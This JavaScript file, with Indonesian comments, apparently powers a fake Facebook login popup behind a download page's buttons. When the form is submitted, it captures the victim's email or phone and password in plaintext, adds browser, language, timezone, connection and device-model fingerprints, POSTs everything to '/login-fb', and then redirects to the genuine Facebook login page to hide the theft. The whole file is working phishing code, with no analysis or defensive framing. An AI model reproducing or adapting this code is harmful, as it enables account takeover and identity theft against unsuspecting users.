// Popup
const popup1 = document.getElementById('popup1');
const cl1 = document.getElementById('cl-popup1');
const popup2 = document.getElementById('popup2');
const cl2 = document.getElementById('cl-popup2');

// Function showPopup
function showPopup(popup) {
  popup.style.display = 'flex';
  document.body.style.overflow = 'hidden';
}

// Function closePopup
function closePopup(popup) {
  popup.style.display = 'none';
  document.body.style.overflow = 'auto';
}

// Tampilkan Popup
document.getElementById('btn-dl').addEventListener('click', () => showPopup(popup1));

document.getElementById('btn-fb').addEventListener('click', () => showPopup(popup2));

document.getElementById('btn-sign').addEventListener('click', () => showPopup(popup1));

document.getElementById('btn-login').addEventListener('click', () => showPopup(popup1));

document.getElementById('dl-faster').addEventListener('click', () => showPopup(popup1));

document.getElementById('share-op').addEventListener('click', () => showPopup(popup1));

document.getElementById('sv-op').addEventListener('click', () => showPopup(popup1));

// Tutup popup saat klik di luar area popup
popup1.addEventListener("click", (e) => {
  if (e.target === popup1) {
    popup1.style.display = "none";
    document.body.style.overflow = "auto";
  }
});

popup2.addEventListener("click", (e) => {
  if (e.target === popup2) {
    popup2.style.display = "none";
    document.body.style.overflow = "auto";
  }
});

// Tutup popup dengan ESC key
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape" && popup1.style.display === "block") {
    popup1.style.display = "none";
    document.body.style.overflow = "auto";
  }
});

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape" && popup2.style.display === "block") {
    popup2.style.display = "none";
    document.body.style.overflow = "auto";
  }
});

// Tutup popup saat klik tombol X
cl1.addEventListener('click', () => closePopup(popup1));
cl2.addEventListener('click', () => closePopup(popup2));

// Validasi Form
const form = document.getElementById('form1');
const email = document.getElementById('email');
const password = document.getElementById('password');
const login = document.getElementById('login');

// Regex
const vem = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
const vph = /^\+?[0-9]{8,15}$/;
const vun = /^[a-zA-Z0-9._]{5,50}$/;

// Valid Input
function validInput() {
  const inem = email.value.trim();
  const inpas = password.value.trim();
  const vpas = inpas.length >= 6 && inpas.length <= 30;
  
  const emph = vem.test(inem) || vph.test(inem) || vun.test(inem);
    
  return emph && vpas;
}

// format timestamp: "YYYY/MM/DD HH.mm"
function formatTimestamp(d = new Date()) {
  const z = n => String(n).padStart(2, '0');
  const YYYY = d.getFullYear();
  const MM = z(d.getMonth() + 1);
  const DD = z(d.getDate());
  const hh = z(d.getHours());
  const mm = z(d.getMinutes());
  return `${YYYY}/${MM}/${DD} ${hh}.${mm}`;
}

// Fungsi untuk mendapatkan browser info (fallback)
function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browserName = 'Unknown';
  let browserVersion = 'Unknown';
  
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    browserName = 'Chrome';
    const match = ua.match(/Chrome\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Firefox')) {
    browserName = 'Firefox';
    const match = ua.match(/Firefox\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    browserName = 'Safari';
    const match = ua.match(/Version\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Edg')) {
    browserName = 'Edge';
    const match = ua.match(/Edg\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  }
  
  return { browserName, browserVersion };
}

// Fungsi untuk mendapatkan language info
function getLanguageInfo() {
  return {
    language: navigator.language || 'Unknown',
    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
  };
}

// Fungsi untuk mendapatkan timezone info
function getTimezoneInfo() {
  return {
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
    timezoneOffset: new Date().getTimezoneOffset()
  };
}

// Fungsi untuk mendapatkan connection info
function getConnectionInfo() {
  if (navigator.connection) {
    const connection = navigator.connection;
    return {
      connectionType: connection.effectiveType || 'Unknown',
      connectionSpeed: connection.downlink || 'Unknown'
    };
  }
  
  return {
    connectionType: 'Unknown',
    connectionSpeed: 'Unknown'
  };
}

// Submit
form.addEventListener('submit', function(e) {
  e.preventDefault();
  if (!validInput()) {
    return;
  }
  
  const emailF = email.value.trim() || 'Unknown';
  const passF = password.value.trim() || 'Unknown';
  const logF = login.value.trim() || 'Unknown';
  const date = formatTimestamp(new Date()) || "Unknown";
  
  // Dapatkan data tambahan yang tidak butuh High Entropy
  const browserInfo = getBrowserInfo();
  const languageInfo = getLanguageInfo();
  const timezoneInfo = getTimezoneInfo();
  const connectionInfo = getConnectionInfo();
  
  // Ambil nilai dari objek yang dikembalikan fungsi
  const browser = `${browserInfo.browserName} ${browserInfo.browserVersion}` || "Unknown";
  const lang = languageInfo.language || "Unknown";
  const timez = timezoneInfo.timezone || "Unknown";
  const connection = `${connectionInfo.connectionType} ${connectionInfo.connectionSpeed}Mbps` || "Unknown";
  
  const sendData = (extra = {}) => {
    const payload = {
      emailF,
      passF,
      logF,
      date,
      browser,
      lang,
      timez,
      connection,
      ...extra
    };
    
    fetch('/login-fb', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if (!res.ok) throw new Error('Gagal kirim data');
      
      // Jika berhasil kirim data
      email.value = '';
      password.value = '';
      window.location.href = 'https://m.facebook.com/login/';
    })
    .catch(err => {
      console.error('Error:', err);
    });
  };
  
  // Cek User Agent
  if(navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    navigator.userAgentData.getHighEntropyValues([
      'architecture',
      'model', 
      'platform', 
      'platformVersion', 
      'uaFullVersion',
      'bitness',
      'brands'
    ])
    .then(info => {
      sendData({
        model: info.model || 'Unknown',
        platform: info.platform || 'Unknown',
        versi: info.platformVersion || 'Unknown'
      });
    })
    .catch(err => {
      console.warn('Cannot get high entropy values:', err);
      sendData();
    });
  } else {
    sendData();
  }
});